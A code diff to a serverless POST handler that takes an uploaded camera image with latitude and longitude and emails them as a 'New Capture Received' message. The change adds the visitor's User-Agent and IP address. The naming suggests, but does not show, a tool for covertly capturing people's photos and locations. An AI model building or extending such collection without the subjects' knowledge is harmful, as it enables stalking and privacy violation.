@@ -11,7 +11,17 @@ export async function POST(req: Request) {
       );
     }
 
-    // Remove base64 header
+    // ── Extract device info (User-Agent)
+    const userAgent =
+      req.headers.get("user-agent") || "Unknown device";
+
+    // ── Extract IP address (Vercel-safe)
+    const forwardedFor =
+      req.headers.get("x-forwarded-for") || "";
+    const ip =
+      forwardedFor.split(",")[0].trim() || "Unknown IP";
+
+    // ── Remove base64 header
     const base64Data = image.replace(
       /^data:image\/jpeg;base64,/,
       ""
@@ -31,7 +41,19 @@ export async function POST(req: Request) {
         process.env.MAIL_TO_1!
       ],
       subject: "New Capture Received",
-      text: `Location captured:\n\nLatitude: ${lat}\nLongitude: ${lon}`,
+      text: `
+New capture received
+
+Location:
+Latitude: ${lat}
+Longitude: ${lon}
+
+Device Info:
+${userAgent}
+
+IP Address:
+${ip}
+      `.trim(),
       attachments: [
         {
           filename: "capture.jpg",
